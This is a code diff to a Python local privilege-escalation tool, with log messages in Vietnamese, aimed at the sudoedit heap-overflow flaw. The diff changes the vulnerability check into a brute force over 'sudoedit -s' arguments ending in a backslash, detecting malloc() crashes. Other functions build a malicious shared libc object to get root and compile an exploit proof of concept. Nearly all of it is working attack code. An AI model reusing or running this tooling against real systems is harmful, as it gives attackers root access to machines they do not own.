@@ -9,7 +9,7 @@ from pwn import process
 from importFile import root_directory,shlex,subprocess,os
 from executeCommand import executeOnce
 from formatOutput.prettyAnnounce import log,bcolors
-from util import clean_terminal, is_path_exist,list_process, list_dir,list_process_as_root,list_dir_verbose,leak
+from util import clean_terminal, is_path_exist,list_process, list_dir,list_process_as_root,list_dir_verbose,leak, stop_terminal
 from cmd import Cmd
 from findInfoSystem import is_Linux
 from menu_list import entry_dynamic_menu
@@ -34,13 +34,24 @@ def check_vuln():
         exit(1)
     else:
         error_key = b'malloc():'
-        
-        for i in range(0,500):
-            output = subprocess.run(["/usr/bin/sudoedit",'-s','aaaaaaaaaaaaaaa\\','b'*i],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-            print(output)
-            if(error_key in output.stderr or error_key in output.stdout):
-                is_vuln = True
-                break
+        for len_a in range(0,500):
+            for len_b in range(0,500):
+                brute_force_argument = [
+                    "/usr/bin/sudoedit",
+                    '-s',
+                    'a'*len_a+'\\',
+                    'b'*len_b
+                ]
+                output = subprocess.run(
+                    brute_force_argument,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE)
+                print(output)
+                if(error_key in output.stderr 
+                    or error_key in output.stdout 
+                    or output.returncode < 0):
+                    is_vuln = True
+                    return is_vuln
         return is_vuln
 
 def build_get_root_libc():
@@ -51,9 +62,6 @@ def build_get_root_libc():
         log.info("Phát hiện thư mục shared object cũ ! Thực hiện xoá !")
         executeOnce(f"rm -rf {lpe_dir}")
     log.info("Khởi tạo thư mục shared object mới")
-    # print(lpe_dir)
-    # print(root_directory)
-    # print()
     executeOnce(f"mkdir {lpe_dir}")
     log.done("Khởi tạo thư mục shared object mới thành công !")
     log.info("Biên dịch source tạo thành đối tượng shared libc !")
@@ -72,7 +80,7 @@ def build_exploit():
     '''
     
     if(is_path_exist(exploit_src_path)==True):
-        log.info("Biên dịch source khai thác lỗi.")
+        log.info("Biên dịch mã nguồn khai thác lỗi.")
         check = executeOnce(f"gcc -std=c99 -o {module_root_path}/poc {exploit_src_path}")
         # print(check)
         if(check.returncode<0):
@@ -122,6 +130,7 @@ def entry():
     if check_vuln() == True:
         print(end='\n')
         log.warning("hệ thống phát hiện lỗi\n".upper())
+        stop_terminal()
         entry_menu()
         
     else:
